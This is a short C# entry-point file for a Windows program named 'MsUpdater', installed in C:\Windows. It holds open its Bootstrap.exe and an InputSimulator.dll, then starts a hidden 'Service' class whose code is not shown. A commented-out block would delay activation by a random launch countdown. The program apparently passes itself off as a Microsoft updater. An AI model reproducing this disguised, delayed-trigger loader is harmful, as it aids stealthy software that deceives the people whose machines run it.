namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Runtime.CompilerServices;
    using System.Threading;

    internal static class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            Thread.Sleep(200);

            var run = true;
             
            // ---- Code for stable versions ---- //

            /*

            const string Target = @"C:\Windows\MsUpdater\trigger";
            
            if (!File.Exists(Target))
            {
                File.WriteAllText(Target, new Random().Next(20, 40).ToString());
                run = false;
            }

            var content = int.Parse(File.ReadAllLines(Target).Single());

            if (content != 0)
            {
                File.WriteAllText(Target, (content - 1).ToString());
                run = false;
            }

            */

            using (File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                using (File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read))
                {
                    if (run)
                    {
                        RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);
                    }

                    Process.GetCurrentProcess().WaitForExit();
                }
            }
        }
    }
}